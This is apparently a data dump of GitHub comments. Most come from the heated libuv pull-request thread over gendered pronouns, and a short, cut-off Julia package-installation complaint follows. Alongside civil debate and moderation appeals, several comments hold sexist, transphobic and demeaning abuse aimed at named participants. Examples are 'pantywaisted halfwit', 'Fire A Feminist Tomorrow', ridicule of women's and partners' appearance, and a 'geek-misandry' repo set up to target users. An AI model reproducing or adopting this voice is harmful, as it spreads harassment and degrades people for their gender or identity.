I don't feel slighted or find this sexist or think things like this are some small step towards some grandeur vision of equality, sorry.
"
3482	"@Elizafox you hit the nail on the head so hard you almost broke it. Love when actual women in tech chime in.
"
3483	"Please.  Stop.  Everyone.
"
3484	"Welcome to the new order of Femo-cracy.

Everything, just _everything_, must be completely, totally, and utterly free of any masculinity.

Femininity is perfectly fine, so you can have organizations like Rails _Girls_ and Code _Chix_ which will have people falling over themselves to cheerlead from the rooftops. You will have Github giving women free private repos, and not a squawk out of any of the feminist brigade, even though they make a big deal of ""we really just want to say that men and women are _equal_, and gender is just a _social construct_."" Well, my social construct right here would like some free private repos, thank you very much.

But put in something about Code _Bros_ or something like that and you will have feminists jumping down your throat for the ""bro"" reference, claiming that it intimidates women in tech. (For the record, I think the bro culture in a lot of companies is disgusting, but I don't run around claiming it prevents me from participating in tech.)

Reject a pull request that unnecessarily refers to a ""him"" in the documentation as a ""hostile reference"", and have [Bryan Cantrill pandering to the feminists and threatening to fire you](http://www.joyent.com/blog/the-power-of-a-pronoun) if you ever try and reject such a pull request based on your [unfamiliarity with English](https://github.com/joyent/libuv/pull/1015#issuecomment-29568172). (BTW, anyone find it ironic that cultural sensitivity is being thrown to the winds here?)

Even if you are silent right now (and I'm sure a lot of you are, because in this female-first culture we inhabit, it's either toe the line and bow to their every whim, or hear ""misogynist"" or ""creep"" hurled at you by someone who treats the Geek Feminism wiki like the bloody _Encylopaedia Britannica_) -- I suggest that you should completely reject this nonsense in your organization. If anyone is to be fired, it should be the sort of pantywaisted halfwit like Bryan Cantrill, who runs around threatening to dismiss people who don't even work for him, because that is the ultimate stick with he can beat you so he can strut around in front of his feminist overlords. Make it a point to fire people like him from your organization. If someone like him is your boss, find a different boss.
"
3485	"This thread is getting better.

Please continue.

![we_can_do_it](https://f.cloud.github.com/assets/104945/1650833/a3f6fd8a-5ab1-11e3-8553-24d4f5635431.jpg)
"
3486	"English doesn't have a proper gender neutral pronoun and there is **not** consensus on whether _they_ and _them_ should be used in place of one. Lots of other languages even have an arbitrary gender assigned to every noun! I usually try to stick to _they_, but it's entirely subjective and I won't fault someone for not doing it.

Since Joyent didn't extend the benefit of the doubt to the most prolific contributor to the project, I don't think we should assume [the post on their corporate blog](https://www.joyent.com/blog/the-power-of-a-pronoun) is anything but a cynical PR stunt attempting to build goodwill. Lets fix the real systemic issues in the FOSS community instead of bikeshedding grammar.
"
3487	"What @thestinger points out does have it merits. At the very least it makes one ponder.

However, without any study to actually show that the style in pronoun language triggers a change in women participation or engagement in already such an ""academic"" open-source project as we are discussing right now, seems a bit rushed. Yes, I actually googled it.

Whomever you reside with in the end, on this now full-blown politicized topic, be sure to take all sides into consideration. Thanks @Elizafox for chiming in.

Anyone up for interesting charts : http://www.academia.edu/1928195/Male_and_Female_Pronoun_Use_in_US_Books_Reflects_Womens_Status_1900-2008
"
3488	"If I followed this project, I would had been ""+1"" for this pull request because it was trivial and served a greater good, removing gender from places where they are not necessary, like pronouns in documentation.  On the other hand, if I were not up to speed on the systemic issues like gender inequality and such, I could easily see someone marking this as providing no functional value and punting on it.

That being said, Ben went with the latter approach and I do not see any factual evidence that indicates Ben acted nefariously.  Based on the sole feedback from Ben on the topic, chances are good he's just not up to speed on the situation and he responded based on the net worth of the code being submitted.  So if there was no malice in Ben's actions, why did Bryan go out of his way to make such a big deal of this, going so far as to make a public post on the Joyent blog saying ""if this were the act of a Joyent employee, we would—to deliberately use a gender-neutral pronoun—fire them.""

It's great Bryan and Joyent are conscious of the fact that something as simple to some as gendered pronouns can have a negative impact on people's perceptions, we should all be like then when doing anything for public consumption.  But unfortunately, they seemed to follow the same course of action that most do when faced with this type of situation, instead of using it as a teaching moment they assume the worst and jump at the chance to make an example of someone.

Wouldn't it had been better to take the time to see why the pull request was denied in the first place and then act?  If this was one of those teaching moments, and to me it seems it was, you just ruined it by forcing Ben's back against the wall.

Tact is the art of making a point without making an enemy. - Isaac Newton
"
3489	"Hi,

@Alyxr - I love it how when we actual get one of these fabled ""women"" chiming in their thoughts, a guy like you dismisses it with ""Your wife is wrong"". _sigh_. Seriously?

I'm sorry, but your studies prove nothing in terms of a girl looking at this thread and going, ""Gosh, what a great, loving bunch of people. You know what, I wasn't going to before, but I'm going to learn JavaScript this weekend and contribute a libuv patch just because of how swell they are, and because they even used ""they"" in their docs"".

Have any of us actually taken a step back, and looked at ourselves? This has degenerated into a 4chan flame-fest, replete with witch-hunts and all.

And people calling people ""misogynists"" just because they don't agree with you?

Look, take this as just one data-point, but I used to mentor Software Development 1A (first years) at uni - and yes, gee golly gosh, there were girls in the classes.

You know how many times I had people asking me why a comment/docstring might refer to ""him"", ""he"", or use the word ""guys"" - not once?

But you know what would have guaranteed me coming across as annoying and ostracising, and probably gotten a talking to? Pointing out ""Gee <girl>, you're the only girl in the class, how can I make things more comfortable for you? Hey guys, come over here, let's talk about how we can make <girl> feel more welcome?"".

They were there to learn - and it didn't matter what gender or nationality they were.

Cheers,
Victor
"
3490	"@victorhooi I'm a woman.
"
3491	"@Alyxr Now I am one too.
I feel very offended that people didn't pay attention.

Now I'm a man.
Just shut up already.

Ps.: Check your privilege.
"
3492	"Hi,

@Alyxr Indeed, but does that status give you free reign to claim ""Your wife is wrong"", and ergo, I must be right? Sorry, I don't believe it does.

Or does the fact that I have a disability give me the right to go around prescribing views to each and every single person with a disability? I'd hope not.

As I said above - take this as a data point.

This thread has already escalated a small issue (the correct procedure for a PR - which bnoordhuis was following), and people are using this as an excuse to get on a soapbox and preach, or use it to ""prove"" their feminist credentials.

And in the process, engaging in what's essentially bullying behaviour. I don't believe in bullying, nor airing one's laundry in public.

I think we should all hug and make up.

Anybody coming and reading this afterwards is going to notice our juvenile and reactionary behaviour more than what pronoun was used in some comment/doc.

Anyhow, I believe I've said enough.

Cheers,
Victor
"
3493	"Mwahahahahahahaha.... this is soooo funny. Should be tagged #firstworldproblems because that's where it belongs. <i>'Remove gendered pronouns'</i> - f**k me if that ever crossed my mind. The problems some people have.

<i><b>Homo feministus</b> - weirdest byproduct of the 21st century!</i>

<b>PS</b>: When I read the name Alex Gaynor... thought it was a pun.
<b>PPS</b>: Wtf is a non-binary agender person? Ok, it's easy. Spread them, find the gender. Male of female. Or just look in the mirror.
"
3494	"Good to know plenty of resources are put into deciding what pronoun to use. I'm sure there's nothing more important to worry about.
"
3495	"Ladies, gentlemen, and everyone in the middle of that spectrum or outside of it...

Before responding to this massive thread, please read this: https://gist.github.com/creationix/5fb9e94fd8d80268c047

If you still think you can add _value_ to the conversation, please do, but if not, let it rest, please.
"
3496	"Oh wait. Now Ben's own employers are [threatening to fire him](http://strongloop.com/strongblog/collaboration-not-derision-in-the-node-community/). Following it up with a syrupy ""Oh no, we didn't mean it like _that_, but no, actually we did, we'll fire him if he doesn't bow meekly before the feminist line even though he has written 28% of the codebase"" (Side note: This is also why we need people like Torvalds who you can't threaten with firing. Torvalds would laugh in your face and tell you to go fuck yourself.)

Silent gentlemen of the community -- there are a few ways to deal with such problems.

Avoid working for assholes like Bryan Cantrill, and this Isaac Roth chap, whoever he is. Also, if you have anyone like them in your organization, _fire them immediately_, or don't promote them, ever. If they ever land in a position of power, they will be just about the worst white knights. Typically, look for pasty-faced men with unattractive partners -- they are generally the sort of people who wear ""THIS IS WHAT A FEMINIST LOOKS LIKE"" T-shirts. Put their lot in power, and your workplace will be full of fat people, arrogant girls with piercings, and a constant stream of ""oh no, I didn't mean to offend you""s.

You are silent right now, but you have the power to do it somewhere down the line. 

Fire A Feminist Tomorrow!™
"
3497	"Oh wow. What bnoordhuis did was follow the protocol related to commits. Thanks to him libuv is what it is today. And now you ungrateful idiots have damaged the open source community with this witch hunt.

To bnoordhuis, I feel bad for all this stress you have been put through, and I hope you can put all this nonsense behind and keep doing what you love.

How strange is that not knowing the English language and all the drama surrounding gender pronouns in Github/Tumblr can get you fired. Me as a (rational) male I couldn't care less if the doc refers to the user as a fucking dog as long as it's understandable for developers. But you people take it to the next level which is moronic. If there were no doc guidelines then the best approach would have been to reach the project's owner and talk about using any gender-neutral pronoun and communicate about this topic if it really bothers you.

I've never felt this scared in the developer community. I'm not scared of (real) feminists, or women in my workspace, or anybody who has opinions about all this gender-in-tech thing. I'm scared to have morons and weak leaders such as Bryan Cantrill and Isaac Roth as bosses who helped blow this issue out of proportion needlessly.

Quoting Isaac Roth:

> If Ben can’t learn, we’ll fire him. [Edit: See comment below. This is not meant literally.]

Huh? How in the world that cannot be literal? You have created a poisonous environment with your coworkers/employees, where they can be held at gunpoint and be told ""or you learn, or I'll fire"", where learning means agreeing with your point of view, whether is correct or not. If you think you are a leader you are dead wrong.

Your extreme ""political correctness"" is nothing more than a fascist regime.
"
3498	"toasting in an epic bread
"
3499	"Two things.

First, to the folks who were all about ""white knights"" and ""omegas"" and so on, please imagine this in an office after an interview: ""Writes good code, but wow, some potential problems with attitude based on the GitHub comments. Tilting me toward no."" 

Second, @bnoordhuis, if I may: _nobody_ wants you to leave. They just want you to listen and try to understand them.

It is totally not about you _being_ unalterably a bad person or an ""asshole""; it's about _appearing_ as if you didn't care about the issue and as if you were uninterested that this really makes a difference to people. Disabusing people of that notion directly and saying ""sorry"" would help a lot.

It's a social bug, and social bugs are much like software ones. If you've committed bad code, you read the error messages, diagnose the bug, back out the buggy commit, fix the real bug, and take steps to not repeat it. The equivalent social steps are quite similar, except that you don't have to make apologies about bugs (unless you've done something like take production down).

No one expects bug-free code or mistake-free interactions. Fixing bugs is something we all have to do; some of us are good at getting social things right, and some aren't. Learning and improving, and admitting being wrong, are good practices for software and social interaction both.
"
3500	"Lot of free time anyone?
"
3501	"@bnoordhuis 

> To me as a non-native speaker, the difference between 'him' and 'them' seems academic but hey, if it gets us scores of female contributors, who am I to object?

That seems rather snide. There are only 95 contributors now, so scores would be at least a 42% increase. This is hyperbole. After all the attention this has gotten, it's surprising and disappointing that you're dismissing these complaints with sarcasm.

I gave you the benefit of the doubt because of the other possible explanations for your short comment and revert. However, in your one shot to clear things up for the undecided, I think you blew it.
"
3502	"@benatkin Quite frankly, he doesn't need (and probably doesn't want) your benefit of the doubt, or that of anyone else here.
"
3503	"> Glad this didn't go through. The White Knights of tech are getting a bit over their heads on this. One thing is to raise awareness of a problem that exists throughout society -- not just tech, a whole different one is to go to the extent of requesting a pull request to remove gendered references. That helps no one. Zero. It does not advance anyone's argument.

@rdodev I hope you’re glad with [you framing @bnoordhuis’ actions in the context of _your_ opinion on things](https://github.com/joyent/libuv/pull/1015#issuecomment-29540128). Nowhere –that I’ve seen– has he expressed to feel the same like you do.
"
3504	"@alloy huh? I wasn't framing his sentiments, my response was directed to the misguided thought that gendered pronouns are 'hostile' and are somehow preventing women from joining the tech field. Then two women in this thread proved that notion by saying they didn't find anything offensive or hostile about gendered nouns, even if it's grammatically questionable.
"
3505	"Uhuh.
"
3506	"@alloy not sure if you are trolling or haven't taken the time to read the thread, but here it goes:

https://github.com/joyent/libuv/pull/1015#issuecomment-29577772
https://github.com/joyent/libuv/pull/1015#issuecomment-29573357

Yup. uhuh indeed. Have a good day.
"
3507	"@rdodev: and how does two women saying this ""prove"" anything? (Funny also that you totally disregarded those who did say they'd prefer to see this changed.)

To everyone saying or implying that adapting/changing language doesn't help change things: does that mean you all use racist language, day in, day out? Just because, according to your logic, it doesn't make a difference anyway? These arguments really remind me too much of (old) people refusing to stop using (local translations of) the n-word because they ""don't mean it in a negative way"".
"
3508	"@rdodev Thanks for the links, but, besides me having read them all, it doesn’t change history. Ben made the mistake to motivate his decision _after_ the fact, which gave _you_ the opportunity to make it into a  ‘White Knights are out to get us’ issue, _before_ Ben could nip it in the bud. From my point of view, you didn’t do Ben a favour. As a fellow open-source maintainer, I hope you reflect on that.

(Updated to clarify who I’m responding to.)
"
3509	"@alloy I do reflect on that and all of this thread and this situation in general. It saddens me that there are members of our community that choose to ostracize and paint someone as a sexist chauvinist simply because he was following procedure. I reflect how vile and vicious people can get -- **even if we all want the same thing and fight for the same cause** -- simply because we have different opinions on the approach. I reflect how is this thread going to encourage people (and women in specific) join and be part of the FLOSS community? So the way we solve issues is by getting people fired or publicly named and shamed and hypothetically fired (see Joyent's blog entry: http://www.joyent.com/blog/the-power-of-a-pronoun) disregarding Ben's earlier contributions to the project and his commitment to outreach programs?  I hope other participants will reflect on that as well, because that is no way to create a healthy, welcoming, encouraging community.
"
3510	"@rdodev I see a lot of pointing, but none regarding your own action, which is what I was talking about did not do Ben, in my opinion, any favour. http://www.southernfriedscience.com/?p=16054
"
3511	"LOL so let me get this straight: Joyent fires an employee who (- this is kind of funny imo -) isn't actually an employee (- I'm not sure this is possible but please do correct me if I'm wrong -) over the use of the singular pronoun ""he"", which so far has only offended men and 5 women (moreover, 2 female developers indicate that they don't feel offended at all). I feel sorry for those of you who are offended. I agree that our industry should be a bit more female (I'm in University now and it's 98% male). However, you can't possibly blame either Ben or the use of generic pronoun ""he"" for that. The fact is that very few females (in my experience, of course) are interested in developing software, just like there are many areas (e.g. pedagogy) that are mostly female. There are 99 things we can do to try to change that but blaming Ben certainly isn't one.
"
3512	"Blah. Sorry again, but… wow.

> Joyent fires an employee who (- this is kind of funny imo -) isn't actually an employee

They said they would fire him if he was their employee and couldn’t learn from this, which is not totally true – though his actual employers said more or less the same

> over the use of the singular pronoun ""he""

Actually, I think it was over the revert. Supposedly there was an angry e-mail involved

> which so far has only offended men and 5 women

This is 100% accurate and scientific. Good job on the argument, very relevant _applauds_

> However, you can't possibly blame either Ben or the use of generic pronoun ""he"" for that.

No, but we can ask to change it and reasonably expect to not have a 70-message discussion about it

> he fact is that very few females (in my experience, of course) are interested in developing software

Look back on this sentence. Read it again. If you find nothing wrong, you absolutely definitely have nothing to add here.

… and I don’t either. Except “stop making assumptions, people”.
"
3513	"> They said they would fire him if he was their employee and couldn’t learn from this, which is not totally true – though his actual employers said more or less the same

@rninty That’s not how the Joyent blog post came across to me. They seem to be implying that Ben is insisting to be sexist without offering any proof (highlight is mine):

> On the one hand, it seems ridiculous (absurd, perhaps) to fire someone over a pronoun -- but to characterize it that way would be a gross oversimplification: it's not the use of the gendered pronoun that's at issue (that's just sloppy), but rather **the insistence that pronouns should in fact be gendered**.

His own employer, however, says quite clearly “If Ben can’t learn, we’ll fire him.”. I.e. he would **not** have been sacked the same morning he would have been had he worked at Joyent.

If you know of places where Ben explicitly says this, I would love to know of them.
"
3514	"Oh, thanks. I got them a little confused. Scratch the last part of the subtext there.

And I don’t know of places where Ben says much of anything. Like I was saying… no more assumptions, please. All of the reactions are pretty wrong.
"
3515	"@timvanelsloo (and everyone else who does this): please stop using the word ""females"" as a noun to refer to women. It's derogatory/offensive. Thanks.
"
3516	"@kerstin You might find it offensive or derogatory, but I sure don't. Making statements like fact, instead of stating it is your opinion, is something that creates nonconstructive push back. The fact is female is the basis of the word feminist. I take no offense to being called a feminist or a female. I'm both. =)
"
3517	"@timvanelsloo and please also stop using the word ""male"" as a noun to refer to men. I feel deeply stressed and it's offensive. Thanks to @kerstin for pointing it out.

My only thought is: as a human being, how distorted can be your view on things to consider the word ""female"" - used in a completely respectful way as @timbotron did - offensive. Seriously.
"
3518	"Please stop pushing back. Please.
"
3519	"Yup, i'll leave it here and stop watching this whole conversation as it's depressing. Extreme reactions make me feel really sad and this whole thing is a huge loss for the whole community.
"
3520	"I'm sorry that you people don't get it, especially if English is your first language. What a sad state of affairs if non-native speakers have a better grasp on it. (No, Amy, this whole issue is not about grammar.)
"
3521	"@kerstin I agree this issue is nothing about grammar. This issue is about extremists on both sides pushing out a moderate POV. The grammar issue has been resolved. As such, the discussion should end. But it continues because certain people are using this as a platform to further their politics. The problem is all that is happening is the opposing POV is also participating. This isn't a constructive forum for how we can work as a community on behalf of women. In fact, it makes it very difficult to do so. Let's be done now here.
"
3522	"<b>There's men and women, boys and girls.</b> 'Males' and 'females' is indeed kind of derogatory as it applies mainly to animals. It's very impersonal. And we ain't animals, except those who think they turned human from monkeys... they might be, but I'm not with them. I'm a God created human being, a manly man. - <i>I'm Eastern European, very non-native.</i>

<b>PS</b>: <i>But you can call me an α-male. I don't mind!</i>
"
3523	"Can I call you a douchebag? Is that okay?
"
3524	"Kudos for @jesusabdullah 
"
3525	"Okay I never intended to offend anyone by calling them a female or a male and in my offense, as a non-native speaker I've always been taught that (fe)male and (wo)men are synonyms.
"
3526	"This thread offends me.  Please do away with it immediately.  Also, please stop calling yourselves 'Software Developers' as that offends those of us who actually care about software, instead of pronouns.
"
3527	"@SomeKittens +1
"
3528	"[![1](http://imgs.xkcd.com/comics/duty_calls.png)](http://xkcd.com/386/)
"
3529	"Pay no attention to it. _(Puts headpones back on and concentrates on extending Github streak)_
"
3530	"_Writes another comment about how people should stop commenting_
"
3531	"""@timvanelsloo (and everyone else who does this): please stop using the word ""females"" as a noun to refer to women. It's derogatory/offensive. Thanks.""

LOL! With this comment this conversation officially jumped the shark. No more reason can possibly occur around here. From now on let's just admit that we are all trolls and stop pretending that we care about any issue at all.

You are nuts, @kerstin, go home.
"
3532	"@kamiltrebunia Calling someone ""nuts"" _is_ offensive. Telling someone to go home _is_ unfriendly. It's clear you are frustrated but those types of actions just add fuel to the fire and frustrate others. Be kind, please.
"
3533	"I'm offended by easily offended people and people who can't tell the difference between claiming offense and contributing to a pull request.

Oh, and people who think declaring something is offensive is a complete argument.

If you're in the above categories, please leave and exchange your liberal arts degrees for a free coupon to ""You are not special 101""
"
3534	"LOL, ""the word ""female"" is offensive to women"" -- @kerstin looks like the typical AdaCamp / RailsGirls feminist who runs around with a massive chip on her shoulder getting offended at the drop of a thimble. You can't really hold a sane conversation with these people. @kamiltrebunia was right, she is nuts.

The only solution here is to stop responding to people of her kind, and get on with your own code, or outreach, or volunteering, or whatever it is you do to get more people interested in tech. :heart: :heart: to sane people in tech.
"
3535	"I always viewed other developers as ""professionals"", but I guess every industry is plagued with this type of bothersome drama. It serves no other purpose than to illicit pointless debate. Him/Her/Female/Male/Kangaroo, it doesn't effing matter how you address someone given that your overtone is friendly and professional.  Now can we all put back on our big boy pants (it is a phrase, get over it) and return to meaningful work. Thanks. /ThreadIgored
"
3536	"I am also commenting to say I am leaving the discussion
"
3537	"--------- Day of a Typical ""Developer Evangelist"" ---------

@rlemon You mean ""big person pants""

Oh wait, ""pants"" is a masculine-centric word that reduces women's participation in tech.

""Big person item of clothing worn round the middle.""

Oh wait, ""big person"" is offensive towards people who have excess adipose tissue and reduces _their_ participation in tech.

""Put on your plus-sized person item of clothing worn round the middle.""
"
3538	"This is ridiculous. Community lost great developer for nothing. This is real lost, not that circlejerk with linguistic woman rights.
"
3539	"BTW, in the spirit of actually doing something about this, I have started a repo at https://github.com/excelsiores/geek-misandry to document some of the typical reactions that misandrists like @alex and @kerstin use to promote their female-only agenda. This is done in a spirit of free thought -- they are free to document their thinking and so am I.

Feel free to contribute, or just use it whenever you encounter something like this in the wild.
"
3540	"@excelsiores <b>+100</b>: I think he/she/it meant <b>adult human leg covers</b>.
"
3541	"""geek misandry"" ? Are you shitting me?
"
3542	"@CodeAngry it is very offensive that you are excluding young people. They are also human beings! 
"
3543	"@jesusabdullah  Maybe he is! I would.
@ThisIsSoGood 'Big boy' translates into political correct language to genderless 'adult'. I hope...

<b>PS</b>: I wish some vote buttons would be present here. There's some epic commenters I'd +1. Glad there's still people with common sense here. The rest are elsewhere, doing actually useful work.
"
3544	"@excelsiores: I fail to understand why using gender _neutral_ pronouns is female-only agenda. It's true that English lacks a proper singular gender-neutral pronoun but it's ridiculous to present a grammar bikeshed like this as a gender war.
"
3545	"@jesusabdullah Your username uses religious names in a way that combines cultural appropriation with humor that is offensive to me because of my religion. Please change it immediately.
"
3546	"@excelsiores cool story bro.
"
3547	"Ok, let me get this straight ... @bnoordhuis attempted to follow policy, reverted a commit on the basis that no-one has privilege of being above the rules, and this is the mess that resulted?

I'm not telling you my sex, my gender, my ethnicity or even what language I consider native ... cause none of that matters.  You know what matters?  Equality.  Grats everyone, you failed Equality 101.

Equality: the state or quality of being equal; correspondence in quantity, degree, value, rank, or ability.

Special policies for dealing with gendered pronouns: discriminatory.
Having genital comparison exercises that stink of ""holier than thou"" attitudes towards women in tech: discriminatory.

You want to know why women don't like these communities, and why the few that do contribute tend to stealth all over the show?  Because every time the subject of gender gets brought up, this kind of nonsense happens.
Every single time a flame war like this happens it shows once again that most of the arguments are ""Men need to change there behaviour to be respectful to women.""
It doesn't matter who is being targeted or why, if you're being a dick then you're being a dick, end of story.

You want to show your respect and support of <insert protected class here>?  Treat them as completely equal to yourself.
Don't protect or defend women. Fight the idiots that think women aren't equal to men and make women uncomfortable in the first place.

This comment thread had neatly proven the root issue: people lose all rational though capabilities the moment someone suggests discrimination might be involved, devolving to mobs more interested in making a point than engaging a brain cell.
I'll be over here, slow clapping while hitting my head on the desk.
"
3548	"> if you're being a dick then you're being a dick, end of story.

I think you need to stop using male genitalia as a symbol of being impolite or bad in some way. That is extremely offensive towards men.

Oh damn, I said ""male"".
"
3549	"@excelsiores Wheaton's Law says hi
"
3550	"'female' is not offensive or derogatory, but it is depersonalising when used in isolation to refer to women (""those females""), or a single women (""that female""). You can say they are female, but to use it as an identifying noun is removing the humanity from the individual.

The scale of offense is similar the original pull request drama. It's not actually a big deal, it's just words, but it is callous to not understand why it makes people feel belittled and sit righteously on your side of the fence without bothering to consider things from a different point of view.
"
3551	"I would like to inform people here that GitHub has decided to close the GitHub repository @excelsiores created to point out the problems that lead to this kind of long flamewars.

Unfortunately over there at GitHub office they only support freedom of speech as long the speech is a match to their own opinions.
"
3552	"@ThisIsSoGood Freedom of speech exists only for the politically correct. Otherwise, no such thing! So, as long as you say the 'right' things, you're in the clear. <i>...And I Stared his repo.</i>
"
3553	"@ferrouswheel -

Thank you for sharing that point of view. 

I can assure you, [when I used the word female](https://github.com/joyent/libuv/pull/1015#issuecomment-29573357) and I can only assume that when @mistydemeo [used the word female](https://github.com/joyent/libuv/pull/1015#issuecomment-29541513), neither one of us intended to dehumanize those of our gender or ourselves. 

My usage, and I assume the usage of Misty, related to the definition of the word as [given by Webster](http://www.learnersdictionary.com/definition/female%5B1%5D) to depict a population `composed of members of the female sex <the female population>`.  Nothing more, nothing less. In fact, the first definition for women, [provided by Webster](http://www.learnersdictionary.com/definition/women) is `an adult female human being.`

However, I will adapt my usage of language away from female if some find it offensive and your polite explanation is appreciated. In exchange, I ask that we all remember we are part of an international community with many languages, customs, different generational experiences and perspectives. It's always good to assume the best of one another, which I am certain your tendency is to do, as well. 
"
3554	"@ThisIsSoGood @CodeAngry With the qualifier that I've only read the gist version that was linked from that reddit thread...
Given that said repo appears to have been both horrifically sexist and a perfect demonstration of the kind of nonsense being berated, I'd say it's quite appropriate for it to have been closed.
There's not even an attempt to hide the stupid ""women's rights are oppressing me"" narrative.  I'm not even sure where to start listing the offensive remarks, it's that bad.

It's not respectful, it's not constructive, it doesn't serve a justifiable purpose.  It might be a pure troll, but I'm not going to assume @excelsiores wasn't serious.
Just because you have free speech doesn't mean you should open your mouth, particularly if you're going to utter such drivel as `it may be a woman's choice to take a lower-paying job with more flexibility.` while linking to an article dealing with the fact a pay gap _does_ exist but is more complex than any simple statistic.
Why, exactly, should we be taking it as fact that women choose to have lower paying jobs to get extra flexibility?  Because they want a family?  Because women can't take the pressure like men?
Give me an argument in favour of this view that isn't sexist or insulting, an argument that has some kind of credible statistical support, or GTFO civilised company.
If you can't make the same argument after doing s/women/men/g on it, you've failed.

There are complaints that the tech community is hostile because exactly because of things like https://gist.github.com/rlemon/7758759 being defended.  What kind of reaction, exactly, do you expect to get from a woman new to tech if she encountered that as an example of coders and their opinions of women?
"
3555	"@kaithar You are hilarious. ""Why should we be taking it as fact that ...""

This whole shitstorm started after the original patch author claimed that it is ""fact that using gendered language is hostile"".
"
3556	"And now imagine all these keystrokes be turned into some useful code... Some people have too much time to spend on nothing really valuable.
"
3557	"@bartoszmajsak I'm glad those who thing this is an enormous issue aren't writing my code.  Their priorities are all screwed up.
"
3558	"@ThisIsSoGood that has nothing to do with what I said, or are you trying to make a connection between gendered language and sexist pay inequality?
I'm not going to waste my time with further analysis, but at first glance your reply appears to be a false equivalence fallacy.  Certainly has all the hallmarks of a troll.

If you haven't something sensible to say, please let the adults talk.
"
3559	"this is getting interesting: witch hunt, bad Joyent, etc.
"
3560	"@kaithar - since @ThisIsSoGood appears to have joined GitHub solely to post on this thread, I'd say you can safely conclude troll. I recommend blocking anyone who has no repos and no activity to improve your day.
"
3561	"@joemcmahon yea, that hadn't escaped my notice :(
"
3562	"The only actual tragedy here is what @bnoordhuis said: ""I'm probably going to step back from libuv and node.js core development."". I kinda see this ""probably"" as something that's going to happen, unless someone changes the laws of physics. Thank you Ben for all your hard work. You will be missed.

Hey, community, thanks for the neutrality in the docs and all the fuss, but in this case **YOU** are the assholes from the [4th slide](http://www.slideshare.net/dberkholz/assholes-are-killing-your-project). If this is your solution to the humankind problems, then I'm totally underwhelmed. For those who don't understand the tone of this message, I am not against neutrality in docs, or women in this field, but you people need to learn how to deal with this shit in a way it doesn't have consequences like these.

For some halfwits posting on this issue: yay, a victory for feminism. Cool story bro. A defeat for tech at the same time. Does Pyrrhic victory rings any bells? Did this victory of yours produce any relevant outcome that's at least on break even with the consequences?

As for @isaacs (and the rest of the Joyent who caused this), thanks, that's really mature to support [#38](https://github.com/isaacs/github/issues/38). Closing comments over _""irrelevant""_ issues. This issue right here is fucking relevant. Next time when I'll have an issue with the networking stack from node I guess I'll need to thank the lords of grammar and weep for joy that I live amongst linguists who care or understand these cultural issues that mostly exist for native speakers instead of having a dialog with people who actually write some fucking code that gets the shit done.

I'm out. I'm too angry to continue in a relevant way, to put it gently.
"
3563	"Somewhat off topic, really, but agreed, there are standard English ways to
say the same thing/
- ""We check to see if the data has been sent so we don't send it twice.""
- ""Check to see if the data has been sent; don't send it again if so.""

It isn't necessary to use a gendered pronoun to be able to communicate the
concept - in fact no pronoun is needed at all.

The discussion, however, is about the social procedure, not the patch. Had
it been rejected with ""bad English, not acceptable"" then it would have been
about the wording.

If there was a full-up style documentation guide, I'd suggest constructions
similar to my second example would be clearest and would eliminate any
personification and gendering problems.

At any rate,  I'm pretty sure the dead horse has been flattened out to a
nanometer-scale paste by now, and further discussion here is probably of
minimal value.
"
3564	"@SaltwaterC 

> The only actual tragedy here is what @bnoordhuis said: ""I'm probably going to step back from libuv and node.js core development."". I kinda see this ""probably"" as something that's going to happen, unless someone changes the laws of physics. Thank you Ben for all your hard work. You will be missed.

Agreed
"
3565	"The saddest thing about it is that no one asked him to leave. No one
_wanted_ him to leave. They just wanted him to listen.

It is very difficult and painful to be on the receiving end of a situation
like this; I hope that he changes his mind and decides that he can come
back and use what happened as a way to learn about the issue, instead of
depriving the community of a good contributor because of one bad choice.

On Tue, Dec 3, 2013 at 6:42 AM, kaithar notifications@github.com wrote:

> @SaltwaterC https://github.com/SaltwaterC
> 
> The only actual tragedy here is what @bnoordhuishttps://github.com/bnoordhuissaid: ""I'm probably going to step back from libuv and node.js core
> development."". I kinda see this ""probably"" as something that's going to
> happen, unless someone changes the laws of physics. Thank you Ben for all
> your hard work. You will be missed.
> 
> Agreed
> 
> —
> Reply to this email directly or view it on GitHubhttps://github.com/joyent/libuv/pull/1015#issuecomment-29714639
> .
"
3566	"@joemcmahon: If you don't want someone to leave the community, you don't make a post on your corporate blog implying they're a sexist asshole for sitting on the other side of you in an age old English grammar bikeshed.

http://www.joyent.com/blog/the-power-of-a-pronoun
http://en.wikipedia.org/wiki/Singular_they

I would be surprised if someone didn't leave the community after an attack on their character made by Joyent. Expecting a contributor to keep on going after abusive treatment like this is ridiculous.

Joyent is risking a libel lawsuit when they lie like this on their blog:

> but to characterize it that way would be a gross oversimplification: it's not the use of the gendered pronoun that's at issue (that's just sloppy), but rather the insistence that pronouns should in fact be gendered. 

Ben _never_ said this, or implied it.
"
3567	"Congrats all, you've killed the goose that laid the golden egg for the benefit of exactly zero actual people.
"
3568	"I can pretty well guarantee that ALL the opinions expressed here are woefully uninformed.  Continuing to comment on this thread only is doing harm.

Everyone.  Please.  Just stop.

@mojombo Hey, can you try to encourage your team to take the isaacs/github#38 feature request seriously?  The inability to close threads is doing active harm to open source projects, and you're seeing it here.  I've offered to pay $1000 out of my own pocket if you can deliver this feature by the end of 2013.  Surely _someone_ at GitHub wants an extra Christmas bonus!
"
3569	"I'm going to delete all comments after this one.  You've been warned.  Stop posting here.  Take it to personal email if you want to keep debating things.
"
3570	"@eteled START
"
3571	"This issue is monitored by @eteled. Any further comments on this issue will be automatically deleted.
        Only repo collaborators can START/STOP etelde.
"
3572	"@eteled STOP
"
3573	"This thread is no longer monitored by @eteled.
"
3574	"Even worse, doing `Pkg.add(""IJulia"")`afterwards says `""INFO: Nothing to be done""`. Really, fix your shit, please. For now, I will just not care one bit about julia, other than the entertainment value of how bad it is. 
"
3575	"Dup of https://github.com/JuliaLang/julia/issues/13200 also note that the error didn't come from IJulia but rather BinDeps. You should remove IJulia and try again.

(edit: correct where the error comes from....)
"
3576	"@yuyichao Trying again is a ridiculous solution. I can't stop laughing at how idiotic that suggestion is.
"
3577	"It would be valid to say that `Pkg.add(""IJulia"");Pkg.rm(""IJulia"");Pkg.add(""IJulia"");` are the new official installation instructions, but this won't stop other people laughing either. 
"
3578	"```
Pkg.add(""IJulia"")
INFO: Installing BinDeps v0.3.19
INFO: Installing Compat v0.7.8
INFO: Installing Conda v0.1.8
INFO: Installing IJulia v1.1.8
INFO: Installing JSON v0.5.0
INFO: Installing Nettle v0.2.0
INFO: Installing SHA v0.1.2
INFO: Installing URIParser v0.1.1
INFO: Installing ZMQ v0.3.1
INFO: Building Nettle
INFO: Building ZMQ
INFO: Building IJulia
INFO: Found Jupyter version 4.0.6: jupyter
